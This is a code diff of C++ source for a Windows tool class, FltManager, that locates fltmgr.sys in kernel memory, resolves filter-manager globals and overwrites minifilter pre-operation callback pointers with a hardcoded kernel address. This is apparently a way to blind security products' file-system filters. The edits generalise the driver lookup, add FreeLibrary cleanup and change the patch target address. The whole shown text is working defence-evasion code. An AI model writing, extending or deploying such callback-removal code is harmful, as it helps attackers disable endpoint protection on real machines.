@@ -16,7 +16,7 @@ DWORD GetFrameCount()
 }
 
 
-PVOID FltManager::ResolveFltmgrBase()
+PVOID FltManager::ResolveDriverBase(const wchar_t* strDriverName)
 {
 	DWORD szBuffer = 0x2000;
 	BOOL bRes = FALSE;
@@ -53,7 +53,7 @@ PVOID FltManager::ResolveFltmgrBase()
 	for (SIZE_T i = 0; i < szNumDrivers; i++) {
 		PVOID lpBaseIter = ((LPVOID*)lpBuf)[i];
 		GetDeviceDriverBaseNameW(lpBaseIter, buffer, 256);
-		if (!lstrcmpiW(L"fltmgr.sys", buffer)) {
+		if (!lstrcmpiW(strDriverName, buffer)) {
 			lpBase = lpBaseIter;
 			break;
 		}
@@ -83,6 +83,7 @@ PVOID FltManager::ResolveFltmgrGlobals(LPVOID lpkFltMgrBase)
 
 	PBYTE lpFltEnumerateFilters = (PBYTE)ldr.get(cexpr_adler32("FltEnumerateFilters"));
 	if (!lpFltEnumerateFilters) {
+		FreeLibrary(hFltmgr);
 		return NULL;
 	}
 
@@ -101,6 +102,7 @@ PVOID FltManager::ResolveFltmgrGlobals(LPVOID lpkFltMgrBase)
 	SIZE_T diff = (SIZE_T)lpData - (SIZE_T)lpFltMgrBase;
 	LPVOID lpkFltEnumerateFilters = (PVOID)((SIZE_T)lpkFltMgrBase + diff);
 	dwOffset = *(INT32*)(lpData + 3);
+	FreeLibrary(hFltmgr);
 	return (PVOID)((SIZE_T)lpkFltEnumerateFilters + 7 + dwOffset - 0x58);
 }
 
@@ -108,7 +110,7 @@ FltManager::FltManager(MemHandler* objMemHandlerArg)
 {
 
 	this->objMemHandler = objMemHandlerArg;
-	this->lpFltMgrBase = ResolveFltmgrBase();
+	this->lpFltMgrBase = ResolveDriverBase(L"fltmgr.sys");
 	this->lpFltGlobals = ResolveFltmgrGlobals(this->lpFltMgrBase);
 	bool b = this->objMemHandler->VirtualRead(
 		((SIZE_T)this->lpFltGlobals + FLTGLB_OFFSET_FLT_RESOURCE_LISTHEAD + FLT_RESOURCE_LISTHEAD_OFFSET_FRAME_COUNT),
@@ -484,7 +486,7 @@ BOOL FltManager::RemovePreCallbacksForVolumesAndCallbacks(std::vector<FLT_OPERAT
 
 				if (lpPreOp == (DWORD64)op.PreOperation) {
 					numPatched++;
-					DWORD64 lpTarget = 0xfffff8061befbf59;
+					DWORD64 lpTarget = 0xfffff8044eb612b7;
 					b = this->objMemHandler->VirtualWrite(
 						lpListIter + CALLBACK_NODE_OFFSET_PREOP,
 						&lpTarget,
